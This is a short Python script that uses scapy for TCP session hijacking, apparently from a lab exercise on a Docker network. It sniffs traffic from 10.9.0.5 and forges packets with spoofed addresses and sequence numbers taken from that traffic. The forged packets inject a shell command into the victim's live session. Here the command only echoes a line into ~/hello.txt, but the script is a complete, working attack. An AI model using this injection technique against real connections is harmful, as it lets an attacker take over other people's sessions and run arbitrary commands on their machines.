from scapy.all import*

def spoof(pkt):
    ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
    tcp = TCP(sport = pkt[TCP].dport, dport  = pkt[TCP].sport, flags = 'A', ack = pkt[TCP].seq+1, seq = pkt[TCP].ack)
    data = "echo \"Is anyone here? (￢_￢)\" >> ~/hello.txt\n\0"
    pkt_new = ip/tcp/data
    ls(pkt_new)
    send(pkt_new,verbose = 0)
    # exit(0)

pkt = sniff(iface = 'br-fd88467e4c1d',filter = 'tcp and src host 10.9.0.5 and(not ether src 02:42:f7:15:0d:43) ', prn = spoof)